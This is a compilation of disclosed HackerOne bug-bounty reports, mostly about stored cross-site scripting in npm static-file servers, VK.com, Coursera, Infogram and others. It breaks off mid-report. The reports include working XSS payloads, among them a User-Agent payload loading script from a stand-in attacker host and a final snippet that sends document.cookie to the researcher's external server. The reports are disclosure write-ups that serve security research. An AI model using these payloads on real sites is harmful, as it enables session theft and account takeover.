---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---

---

### [[simple-server] HTML with iframe element can be used as filename, which might lead to load and execute malicious JavaScript ](https://hackerone.com/reports/309641)

- **Report ID:** `309641`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Stored
- **Program:** Node.js third-party modules
- **Reporter:** @bl4de
- **Bounty:** - usd
- **Disclosed:** 2018-03-01T23:04:03.545Z
- **CVE(s):** CVE-2018-3717

**Vulnerability Information:**

Hi Guys,

**simple-server** allows to embed HTML in file names, which (in certain conditions) might lead to execute malicious JavaScript. This is caused by outdated version of ```connect``` framework.

**Module:** 

Simple Server allows you to easily get a node.js static file server up and running anywhere anytime.

https://www.npmjs.com/package/simple-server

**Description**

This issue is exactly the same I've reported for ```anywhere``` module (https://hackerone.com/reports/309394).
The problem is outdated ```connect``` framework (2.10.0) with obsolete middleware used to display content of the directory as HTML.

This is the code which allows to embed HTML in file names and execute attack described in PoC (```/node_modules/connect/lib/middleware/directory.js```, lines 192-197):

```javascript

    return '<li><a href="'
      + utils.normalizeSlashes(normalize(path.join('/')))
      + '" class="'
      + classes.join(' ') + '"'
      + ' title="' + file + '">'
      + icon + file + '</a></li>';
```

As you can see, ```file``` is output directly into HTML without any sanitization.

Now, take a look how the same fragment of code looks in ```serve-index``` middleware, introduced in place of old middlewares like ```directory.js``` above, and  used in current Connect and Express frameworks (https://github.com/expressjs/serve-index/blob/a399faa1801f02ee1885e5664ed21a9c7990b63a/index.js#L279):

```javascript
return '<li><a href="'
      + escapeHtml(normalizeSlashes(normalize(path.join('/'))))
      + '" class="' + escapeHtml(classes.join(' ')) + '"'
      + ' title="' + escapeHtml(file.name) + '">'
      + '<span class="name">' + escapeHtml(file.name) + '</span>'
      + '<span class="size">' + escapeHtml(size) + '</span>'
      + '<span class="date">' + escapeHtml(date) + '</span>'
      + '</a></li>';
```

All output data is sanitized with ```escapeHtml()``` which sanitizes HTML before is send to browser.

I think this is the problem of all older npm modules using old versions of Connect middlewares like ```directory.js```.


## PoC - Steps To Reproduce:

In the directory which will be served via ```simple-server```, create file with following name:

```
"><iframe src="malware_frame.html">
```

Then, HTML file with following content have to be saved in the same directory as file with the name changed:

```
<html>

<head>
    <meta charset="utf8" />
    <title>Frame embeded with malware :P</title>
</head>

<body>
    <p>iframe element with malicious code</p>
    <script type="text/javascript" src="malware.js"></script>
</body>

</html>
```

An ```src``` attribute value I've used here is just for PoC purpose, this can be any external url.
On my local machine, ```malware.js``` has following content:

```
alert('Uh oh, I am very bad malware!')
```

Run ```simple-server`` in directory where both file with filename changed and ```malware_frame.html``` are saved:

```
$ ./node_modules/simple-server/bin/simple-server.js ./ 8080
Simple-Server listening to http://:::8080/ with directory /Users/bl4de/playground/node_bugbounty_playground
```

and open ```http://127.0.0.1:8080``` in the browser, you can see JavaScript from ```malware.js``` is executed.

## Supporting Material/References:

Configuration I've used to find this vulnerability:

- macOS HighSierra 10.13.3
- node 8.9.3
- npm 5.5.1
- curl 7.54.0

## Wrap up

I hope this report will help to keep Node ecosystem more safe. If you have any questions about any details of this finding, please let me know in comment.

Thank you

Regards,

Rafal 'bl4de' Janicki

## Impact

Exploitation of this vulnerability in the wild might be hard, however it's not impossible and it depends only on attacker's skills to get into directory on the server, where ```simple-server``` is used to serve static content.

---

### [[simplehttpserver] Stored XSS in file names leads to malicious JavaScript code execution when directory listing is output in HTML](https://hackerone.com/reports/309648)

- **Report ID:** `309648`
- **Severity:** Critical
- **Weakness:** Cross-site Scripting (XSS) - Stored
- **Program:** Node.js third-party modules
- **Reporter:** @bl4de
- **Bounty:** - usd
- **Disclosed:** 2018-02-26T21:44:29.711Z
- **CVE(s):** CVE-2018-3716

**Vulnerability Information:**

Hi Guys,

**simplehttpserver** allows to embed HTML in file names, which (in certain conditions) might lead to execute malicious JavaScript.

**Module:** 

'simpehttpserver' is simple imitiation of python's SimpleHTTPServer and intended for testing, development and debugging purposes

https://www.npmjs.com/package/simpehttpserver

**Description**

This issue is another example of lack of output sanitization. 
Here's source code, which allows to embed HTML in file name and run attack presented in PoC section (./node_modules/simplehttpserver/simplehttpserver.js, lines 106-117):


```javascript

    // Check for each file if it's a directory or a file
    var q = async.queue(function(item, cb) {
        fs.stat(path.join(pathname, item), function(err, stat) {
           if ( !stat ) cb();
           if ( stat.isDirectory() ) {
               ulist.push('<li><a href="'+item+'/">'+item+'/</a></li>')
           } else {
               ulist.push('<li><a href="'+item+'">'+item+'</a></li>')
           }
            cb();
        });
    }, 4);
```

As you can see, ```item``` is output directly into HTML without any sanitization.

## PoC - Steps To Reproduce:

In the directory which will be served via ```simple-server```, create file with following name:

```
javascript:alert('You are pwned!')
```

Run ```simplehttpserver``` in directory with file with changed filename:

```
$ ./node_modules/simplehttpserver/cli.js
Listening 0.0.0.0:8000 web root dir /Users/bl4de/playground/node_bugbounty_playground
```

and open ```http://127.0.0.1:8000``` in the browser.

Try to open file with name ```javascript:alert('You are pwned!')``` by clicking it.

{F257774}

## Supporting Material/References:

Configuration I've used to find this vulnerability:

- macOS HighSierra 10.13.3
- node 8.9.3
- npm 5.5.1
- curl 7.54.0

## Wrap up

I hope this report will help to keep Node ecosystem more safe. If you have any questions about any details of this finding, please let me know in comment.

Thank you

Regards,

Rafal 'bl4de' Janicki


## Impact:

This vulnerability can be used to eg. download malware via "drive-by-download" attacks. Also, as described in other modules I've reported similar vulnerabilty, an iframe with malicious JS file loaded from external resource can be executed.

## Impact

This vulnerability can be used to eg. download malware via "drive-by-download" attacks. Also, as described in other modules where I've reported similar vulnerabilty, an iframe with malicious JS file loaded from external resource can be executed.

---

### [[anywhere] An iframe element with url to malicious HTML file (with eg. JavaScript malware) can be used as filename and served via anywhere](https://hackerone.com/reports/309394)

- **Report ID:** `309394`
- **Severity:** Critical
- **Weakness:** Cross-site Scripting (XSS) - Stored
- **Program:** Node.js third-party modules
- **Reporter:** @bl4de
- **Bounty:** - usd
- **Disclosed:** 2018-02-26T21:36:11.607Z
- **CVE(s):** CVE-2018-3717

**Vulnerability Information:**

Hi Guys,

**anywhere** allows to embed HTML in file names, which (in certain conditions) might lead to execute malicious JavaScript.

**Module:** 

Running static file server anywhere.

https://www.npmjs.com/package/anywhere

**Description**



To embed malicious ```<script>``` tag with JavaScript code to execute, ```/``` character is necessary.
In all operating systems, ```/``` is not allowed as a character used in file name. This means there is very few option to craft an attack using file name as injection point.

## Steps To Reproduce:

However, if attacker wants to, one can still use some tricks and change one of the filenames into something like following example:

```
"><iframe src="malware_frame.html">
```

Then, HTML file with following content have to be saved in the same directory as file with the name changed:

```html
<html>

<head>
    <meta charset="utf8" />
    <title>Frame embeded with malware :P</title>
</head>

<body>
    <p>iframe element with malicious code</p>
    <script type="text/javascript" src="malware.js"></script>
</body>

</html>
```

An ```src``` attribute value I've used here is just for PoC purpose, this can be any external url.
On my local machine, ```malware.js``` has following content:

```javascript
alert('Uh oh, I am very bad malware!')
```

Now, if you run ```anywhere``` in directory where both file with filename changed and ```malware_frame.html``` are saved:

```
$ ./node_modules/anywhere/bin/anywhere -p 8080
Running at http://192.168.1.1:8080/
Also running at https://192.168.1.1:8081/
```

and open ```http://127.0.0.1:8080``` in the browser, you can see JavaScript from ```malware.js``` is executed:

{F257400}

## Supporting Material/References:

Configuration I've used to find this vulnerability:

- macOS HighSierra 10.13.3
- node 8.9.3
- npm 5.5.1
- curl 7.54.0

## Wrap up

I hope this report will help to keep Node ecosystem more safe. If you have any questions about any details of this finding, please let me know in comment.

Thank you

Regards,

Rafal 'bl4de' Janicki

## Impact

Exploitation of this vulnerability in the wild might be hard, however it's not impossible and it depends only on attacker's skills to get into directory on the server, where ```anywhere``` is used to serve static content.

---

### [[crud-file-server] Stored XSS in filenames when directory index is served by crud-file-server](https://hackerone.com/reports/311101)

- **Report ID:** `311101`
- **Severity:** Critical
- **Weakness:** Cross-site Scripting (XSS) - Stored
- **Program:** Node.js third-party modules
- **Reporter:** @bl4de
- **Bounty:** - usd
- **Disclosed:** 2018-02-17T17:51:51.597Z
- **CVE(s):** CVE-2018-3726

**Vulnerability Information:**

Hi Guys,

**crud-file-server** allows to embed HTML in file names, which (in certain conditions) might lead to execute malicious JavaScript.

## Module

**crud-file-server**

This package exposes a directory and its children to create, read, update, and delete operations over http.

https://www.npmjs.com/package/crud-file-server

version: 0.7.0

Stats
0 downloads in the last day
26 downloads in the last week
220 downloads in the last month

~2500 estimated downloads per year


## Description

This vulnerability exists, because ```name``` which represents filename(s) is output in HTML without any sanitization. This allows to embed malicious code in filenames listed in directory:

```javascript
// node_modules/crud-file-server/crud-file-server.js, line 137
    res.setHeader('Content-Type', 'text/html');											
    res.write('<html><body>');
    for(var f = 0; f < results.length; f++) {
        var name = results[f].name;
        var normalized = url + '/' + name;
        while(normalized[0] == '/') { normalized = normalized.slice(1, normalized.length); }
        res.write('\r\n<p><a href="/' + normalized + '">' + name + '</a></p>');
    }
    res.end('\r\n</body></html>');
```
## PoC - Steps To Reproduce:

- install ```crud-file-server```

```
$ npm install crud-file-server
```


- in the directory which will be served via ```crud-file-server```, create file with following name:

```
"><iframe src="malware_frame.html">
```

- create second file with name ```malware_frame.html``` with following content and save it in the same directory:


```
<html>

<head>
    <meta charset="utf8" />
    <title>Frame embeded with malware :P</title>
</head>

<body>
    <p>iframe element with malicious code</p>
    <script type="text/javascript" src="http://bl4de.tech/poc.js"></script>
</body>

</html>
```

Run ```crud-file-server``` in directory with file with changed filename:

```
$ ./node_modules/crud-file-server/bin/crud-file-server -f ./ -p 8080

usage:
  crud-file-server [options]

this starts a file server using the specified command-line options

options:

  -f file system path to expose over http
  -h log head requests
  -p port to listen on (example, 80)
  -q suppress this message
  -r read only
  -v virtual path to host the file server on

example:

  crud-file-server -f c:/ -p 8080 -q -v filez

listening on :8080/, serving ./
```

and open ```http://127.0.0.1:8000``` in the browser. You will notice an alert served from bl4de.tech, executed in context of page with directory index:

{F259251}


## Supporting Material/References:

Configuration I've used to find this vulnerability:

- macOS HighSierra 10.13.3
- node 8.9.3
- npm 5.5.1
- curl 7.54.0

## Wrap up

I hope this report will help to keep Node ecosystem more safe. If you have any questions about any details of this finding, please let me know in comment.

Thank you

Regards,

Rafal 'bl4de' Janicki

## Impact

This vulnerability can be used to eg. download malware via "drive-by-download" attacks. Also, as described in other modules I've reported similar vulnerabilty, an iframe with malicious JS file loaded from external resource can be executed.

---

### [Blind XSS in Mobpub Marketplace Admin Production | Sentry via demand.mopub.com (User-Agent)](https://hackerone.com/reports/275518)

- **Report ID:** `275518`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Stored
- **Program:** X / xAI
- **Reporter:** @harisec
- **Bounty:** - usd
- **Disclosed:** 2018-02-17T06:15:52.724Z
- **CVE(s):** -

**Vulnerability Information:**

**Summary:** 
I've identified a Blind XSS vulnerability that fires in the `Mobpub Marketplace Admin Production | Sentry` dashboard and can be triggered by sending a HTTPS request to an endpoint from the domain **demand.mopub.com**.

**Description:** 
I've sent the following HTTPS request to the following URL `https://demand.mopub.com/accounts/login/`

```
GET /accounts/login/ HTTP/1.1
Referer: 1
User-Agent: '>"></title></style></textarea></script><script/src=attacker.com/js></script>
X-Forwarded-For: 1
Host: demand.mopub.com
Accept-Encoding: gzip,deflate
Accept: */*
X-OrigHost: demand.mopub.com

```

Please note that the value of the `User-Agent` header is set to an **Blind XSS payload** (I've used `attacker.com/js` as an example but initially it was set to an script loaded from my test domain `thx.bz`.

Some time later after this initial request I've received two hits and the script from `thx.bz` was downloaded and executed. The script is configured to extract information from the browser context for demonstration purposes.

I've extracted the content of the browser DOM (attached to this report as **DOM.html**) and other interesting information:

**Dashboard Page URL**

`http://sentry-test.mopub.com/exchange-marketplace/marketplace-admin-production/`

**User IP Address**
`█████████`

**Title**
`Marketplace Admin Production | Sentry`

**User-Agent**
`█████████`

**Cookies**
`██████
`
 
**Execution Origin**
`http://sentry-test.mopub.com`

If you open the attachment **DOM.html** in a browser and search for `thx.bz` you will see that the value of the `User-Agent` is reflected inside a `<option>` tag without proper encoding and it was possible to escape the context and inject an additional `SCRIPT` tag.

The IP address that was used to visit the dashboard is `███████` and I've verified that it belongs to Twitter.

## Steps To Reproduce:

- Send the following HTTPS request (while replacing `attacker.com/js` with a domain/URL you control and where you can inspect the web server logs).

```
GET /accounts/login/ HTTP/1.1
Referer: 1
User-Agent: '>"></title></style></textarea></script><script/src=attacker.com/js></script>
X-Forwarded-For: 1
Host: demand.mopub.com
Accept-Encoding: gzip,deflate
Accept: */*
X-OrigHost: demand.mopub.com

```

- Login into `http://sentry-test.mopub.com/` using administrative credentials and visit the vulnerable URL 
`http://sentry-test.mopub.com/exchange-marketplace/marketplace-admin-production/`.

- At this point a script should be loaded from your domain (the one you've used instead of `attacker.com/js`).

## Impact: 

An attacker can gain access and execute arbitrary JavaScript code in the context of the administrative dashboard `Mobpub Marketplace Admin Production | Sentry`.

## Supporting Material/References:

  * List any additional material (e.g. screenshots, logs, etc.)

I've attached the contents of browser DOM where the Blind XSS triggered (`DOM.html`), more information about the execution context `bxss-report.html` and screenshots from the the browser DOM.

---

### [Markdown parsing issue enables insertion of malicious tags and event handlers](https://hackerone.com/reports/299728)

- **Report ID:** `299728`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Stored
- **Program:** HackerOne
- **Reporter:** @dr_dragon
- **Bounty:** 5000 usd
- **Disclosed:** 2018-01-29T16:37:43.067Z
- **CVE(s):** -

**Vulnerability Information:**

When markdown is being presented as HTML, there seems to be a strange interaction between _ and @ that lets an attacker insert malicious tags.

# Proof of Concept :
```
</http:<marquee>hello
```

is rendered converted to the following HTML:

```
<p><a title="/http:<marquee" href="/http:%3Cmarquee" target="_blank">/http:<marquee>hello</p>
</marquee></a></p>
```
As you can see, the output includes a </http:<marquee tag that I can add arbitrary attributes (including event handlers).

## Impact

When markdown is being presented as HTML, there seems to be a strange interaction between _ and @ that lets an attacker insert malicious tags.

---

### [Stored XSS => community.ubnt.com ](https://hackerone.com/reports/294048)

- **Report ID:** `294048`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Stored
- **Program:** Ubiquiti Inc.
- **Reporter:** @khizer47
- **Bounty:** - usd
- **Disclosed:** 2018-01-10T12:23:14.308Z
- **CVE(s):** -

**Summary (team):**

Due to an error on the user input validation process, it was possible to create posts in some forums on community.ubnt.com with arbitrary HTML code, an especially crafted message could inject Javascript code on the page, resulting in stored XSS.

**Summary (researcher):**

A Stored XSS issue Was Discovered in ubnt Community. The specially crafted XSS payload can be Posted as Comment under Any Post, The payload Executes and Collect certain User Information and Can be Further Used to Exploit for Account takeover Issue, Thanks to @ubnt-rubens For Guidances on the issue as it wasIn out of Scope subdomain, & Thanks @ubnt for The Bounty

---

### [Хранимая XSS на странице "Виджет для авторизации"](https://hackerone.com/reports/273960)

- **Report ID:** `273960`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Stored
- **Program:** VK.com
- **Reporter:** @abr1k0s
- **Bounty:** - usd
- **Disclosed:** 2017-12-31T11:39:12.381Z
- **CVE(s):** -

**Summary (team):**

Self-XSS на странице документации виджета.

**Summary (researcher):**

На счет того Self-XSS это или нет - оставляю на усмотрение общественности. Но лично мое мнение - команда vk тут все же ошибается.

Для эксплуатации уязвимости атакующий должен был:
Создать приложение с именем javascript:alert(1);//
Добавить атакуемого пользователя в администраторы приложения
Сделать атакуемого пользователя главным администратором

Уязвимость воспроизводилась, когда атакуемый попадал на страницу  https://vk.com/dev/Login через историю. Например, переходил на другой сайт (не важно какой), а затем нажимал в браузере кнопку "назад".

В ходе исправления уязвимости она переродилась из хранимой в reflected и воспроизводилась при использовании этого url https://vk.com/dev.php?aid=6216706&method=Login&url=javas%03cript%3Aalert(1)%3B//

В ходе дальнейших исправлений было найдено множество способов их обойти. Том числе использовались такие векторы:
https://vk.com/dev.php?aid=6216706&method=Login&url=Java%0aScript:alert(2)%3B//
https://vk.com/dev.php?aid=6216706&method=Login&url=%03JavaScript:alert(1)//
и менее опасный:
https://vk.com/dev.php?aid=6216706&method=Login&url=data:text/html,%3Cscript%3Ealert(1)%3B%3C/script%3E

---

### [Хранимая XSS в функционале добавления аудио в WYSIWYG](https://hackerone.com/reports/274112)

- **Report ID:** `274112`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Stored
- **Program:** VK.com
- **Reporter:** @abr1k0s
- **Bounty:** 500 usd
- **Disclosed:** 2017-12-31T11:31:35.198Z
- **CVE(s):** -

**Summary (team):**

XSS в Wiki.

---

### [[marketplace.informatica.com] - Stored XSS](https://hackerone.com/reports/277259)

- **Report ID:** `277259`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Stored
- **Program:** Informatica
- **Reporter:** @jubabaghdad
- **Bounty:** - usd
- **Disclosed:** 2017-12-15T05:14:31.569Z
- **CVE(s):** -

**Summary (team):**

The researcher has identified and reported a Stored XSS in Informatica website and helped us in resolving the issue.

---

### [Stored xss via template injection](https://hackerone.com/reports/250837)

- **Report ID:** `250837`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Stored
- **Program:** WordPress
- **Reporter:** @morningstar
- **Bounty:** - usd
- **Disclosed:** 2017-12-11T13:36:15.053Z
- **CVE(s):** -

**Vulnerability Information:**

Hello Sir , I found Stored XSS in https://mercantile.wordpress.org/
POC is attached .
Steps to reproduce:
1.Login to your account.
2. Go to https://mercantile.wordpress.org/my-account/edit-address/ & fill details , press save & intercept this request in burp suit.
3.change name to {{constructor.constructor('alert(1)')()}} & forward request. as shown in screenshot.
Xss will popup when you visit your account page.
 
    Although its self XSS. but  following attack  scenario makes it useful.
Anyone can make account on https://mercantile.wordpress.org/ using someone else email id, Its not verifying whether its your email id or not. Lets consider "A" makes account with "B" persons email & by using this technique store XSS payload in its account. After that "B" wants account on mercantile.wordpress.org with same email. so rather creating account with new email, "B" person just do forget password & recover & recover his account. but xss payload is still there in his account so attacker "A" can access victim "B" account anytime.
        One more thing, even after changing name with https://mercantile.wordpress.org/my-account/edit-account/ setting payload is not removed its still there. so its make attack more sophisticated. 
     
Thanks & Regards,
Akshay

---

### [Report Design Critical Stored DOM XSS Vulnerability ](https://hackerone.com/reports/282909)

- **Report ID:** `282909`
- **Severity:** Critical
- **Weakness:** Cross-site Scripting (XSS) - Stored
- **Program:** Infogram
- **Reporter:** @mksecurity
- **Bounty:** - usd
- **Disclosed:** 2017-12-08T12:49:48.474Z
- **CVE(s):** -

**Vulnerability Information:**

Hi Team,

Another XSS vulnerability in report designer but this one is critical. 

**Problem Point**
Report's Overview Table

**Report Creation Url**
https://infogram.com/app/#edit/e7b161f1-f708-48e5-bab7-de9887ae202a

**Sample Data**
<a href="" onmouseover="javascript:alert('HackerOne MkSecurity Dom XSS');">Click for Detail</a>

**Sample URL** 
https://infogram.com/report-classic-1g57pr0g3xdvp01

---

### [Stored XSS via transloadit.com and imageproxy](https://hackerone.com/reports/216822)

- **Report ID:** `216822`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Stored
- **Program:** Coursera
- **Reporter:** @c0rdis
- **Bounty:** - usd
- **Disclosed:** 2017-11-30T21:38:45.594Z
- **CVE(s):** -

**Vulnerability Information:**

Hello,
due to poor input file validation on transloadit.com, it is possible to upload and process any filetype on their server, which would later be uploaded to coursera-profile-photos.s3.amazonaws.com. From there, since imageproxy trusts coursera-profile-photos.s3.amazonaws.com, one can fetch arbitrary content and, in case of javascript, get it executed in the browser. 

Steps to reproduce:

1) Let's send html file with trivial XSS vector to transloadit.com. Please note that no authentication is required.
POST /assemblies/[hash]?redirect=false HTTP/1.1
Host: isadora.transloadit.com
Referer: https://api.coursera.org/account/profile
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: multipart/form-data; boundary=---------------------------185739484714145007371896001880
Content-Length: 521

-----------------------------185739484714145007371896001845
Content-Disposition: form-data; name="params"

{"max_size":1048576,"auth":{"key":"[hash2]"},"template_id":"[hash3]"}
-----------------------------185739484714145007371896001845
Content-Disposition: form-data; name="my_file"; filename="stored_xss.html"
Content-Type: text/html

<html>
<script>
alert(document.cookie);
</script>
</html>
-----------------------------185739484714145007371896001845--

2) By accessing https://isadora.transloadit.com/assemblies/[hash]?seq=0&callback=, we can learn the URL of the uploaded malicious file (in this case it's http://coursera-profile-photos.s3.amazonaws.com██████████stored_xss.html)

3) Since it's already trusted, we could use it to upload as the profile photo, or to fetch via imageproxy as mentioned above. Final URL: https://www.coursera.org/api/utilities/v1/imageproxy/http://coursera-profile-photos.s3.amazonaws.com█████stored_xss.html

Please find the screenshot attached.
AA

---

### [Stored xss в /lead_forms_app.php](https://hackerone.com/reports/283539)

- **Report ID:** `283539`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Stored
- **Program:** VK.com
- **Reporter:** @executor
- **Bounty:** 500 usd
- **Disclosed:** 2017-11-28T10:51:43.572Z
- **CVE(s):** -

**Summary (team):**

XSS в "Форме сбора заявок".

**Summary (researcher):**

Жесть.........

---

### [XSS в личных сообщениях](https://hackerone.com/reports/281851)

- **Report ID:** `281851`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Stored
- **Program:** VK.com
- **Reporter:** @vladvis
- **Bounty:** - usd
- **Disclosed:** 2017-11-27T15:08:09.882Z
- **CVE(s):** -

**Summary (team):**

XSS в ссылках в личных сообщениях, приходящих в реалтайме.

---

### [Stored XSS on profile page via Steam display name](https://hackerone.com/reports/282604)

- **Report ID:** `282604`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Stored
- **Program:** Rockstar Games
- **Reporter:** @alexbirsan
- **Bounty:** 1250 usd
- **Disclosed:** 2017-11-10T15:12:02.257Z
- **CVE(s):** -

**Summary (team):**

The researcher was able to demonstrate a XSS vulnerability by using their Steam nickname as the payload vector. This was due to insufficient filtering on Linked Account name fields. We pushed out an update that replaces suspicious Linked Account names with a generic string in order to prevent future such attacks.

**Summary (researcher):**

The user's Steam display name was shown on their profile page, inside a javascript string. 
I added a `</script>` to my Steam username to break out and achieve XSS. 
This was fixed by replacing the whole Steam username with a generic string whenever it looks suspicious.

This exploit required buying a Rockstar game on Steam :)

---

### [XSS on infogram.com](https://hackerone.com/reports/283565)

- **Report ID:** `283565`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Stored
- **Program:** Infogram
- **Reporter:** @mondhers
- **Bounty:** - usd
- **Disclosed:** 2017-11-01T10:02:27.325Z
- **CVE(s):** -

**Vulnerability Information:**

Hello,

There is a XSS on Report templates.

Free templates : Report Classic 

When we modify the values of table we can put XSS Payload.

Payload used : 

"><img src=x onerror=prompt(0);>
"/><svg/onload=alert(0);>

---

### [Хранимая XSS в группе VK](https://hackerone.com/reports/266072)

- **Report ID:** `266072`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Stored
- **Program:** VK.com
- **Reporter:** @sql
- **Bounty:** 500 usd
- **Disclosed:** 2017-10-28T00:48:37.217Z
- **CVE(s):** -

**Summary (team):**

Недостаточная фильтрация в боксе удаления приложения.

**Summary (researcher):**

Stored XSS в группе VK приложения.

---

### [Stored XSS on member post feed](https://hackerone.com/reports/264002)

- **Report ID:** `264002`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Stored
- **Program:** Rockstar Games
- **Reporter:** @0x0luke
- **Bounty:** 1000 usd
- **Disclosed:** 2017-09-18T16:31:19.946Z
- **CVE(s):** -

**Summary (team):**

In this report, the researcher found a Stored XSS vulnerability in Profile Feeds. A POC was provided demonstrating the ability to affect any accessible member's Feed. We improved our filtering to automatically remove the harmful input, specifically including the bypass technique the researcher employed.

---

### [Blind stored xss [parcel.grab.com] > name parameter ](https://hackerone.com/reports/251224)

- **Report ID:** `251224`
- **Severity:** Critical
- **Weakness:** Cross-site Scripting (XSS) - Stored
- **Program:** Grab
- **Reporter:** @paresh_parmar
- **Bounty:** 750 usd
- **Disclosed:** 2017-09-14T11:41:24.572Z
- **CVE(s):** -

**Vulnerability Information:**

Hi,


___my previously reported blind xss is fixed but i found same type of xss in diffrent area with more impact.___


# Steps to repro:
1. create new account with name `"><script src=https://x.com></script>` here https://parcel.grab.com/
2.  afftected page is https://app.detrack.com/a/
where admin can see all the user's of application
and this is one more impact full because it contains all the user's email address. attacker can hijack all the information from there using xss
affeffcted page poc:
{F204498██████████
3. go here https://app.detrack.com/a/ and find ████████ , that is my account with xss payload.


thanks

---

### [Stored XSS in Private Messages 'Reply' allows to execute malicious JavaScript against any user while replying to the message which contains payload](https://hackerone.com/reports/247517)

- **Report ID:** `247517`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Stored
- **Program:** Concrete CMS
- **Reporter:** @bl4de
- **Bounty:** - usd
- **Disclosed:** 2017-08-17T22:12:55.495Z
- **CVE(s):** -

**Vulnerability Information:**

## Intro

"Back to the Crayons"

__Type of issue__: Core CMS issue
__Level of severity__: External Attack Vector
__Concrete5 version__: 8.2.0 RC2 rev. 32c9daf352645d4fafedb7b956e7f2de4e153ab3 (July 8th)

## Summary

There is __Stored XSS__ vulnerability in Private Messages 'Reply' feature, when original message is quoted in reply content (this is by default). This issue can be used against any user, who accepted receiving private messages and replies to the message contains malicious payload.

To exploit this vulnerability an attacker has to trick other user to reply to his message.

## Steps to reproduce

- log in to concrete5 instance as any user
- go to ```index.php/account/messages```. Change url to ```index.php/account/messages/write/1``` which is equivalent to sending PM to __admin__ (changing user id in url to any other value allows to send message to selected user)
- set message title, then as a content of message put (at the end): closing ```</textarea>``` tag followed by any valid JavaScript code inside ```<script>``` tag. 

{F201511}

I used following payload in my attack:

```html
</textarea>
<script>
    var i = document.createElement('img')
    i.src = 'https://bl4de.000webhostapp.com/?c=' + document.cookie;
    document.body.append(i);
</script>
```

It creates and appends ```img``` element with url which points to my server on 000web hosting and allows to send cookie(s) to my PHP script:

```php
Hello :)
<?php
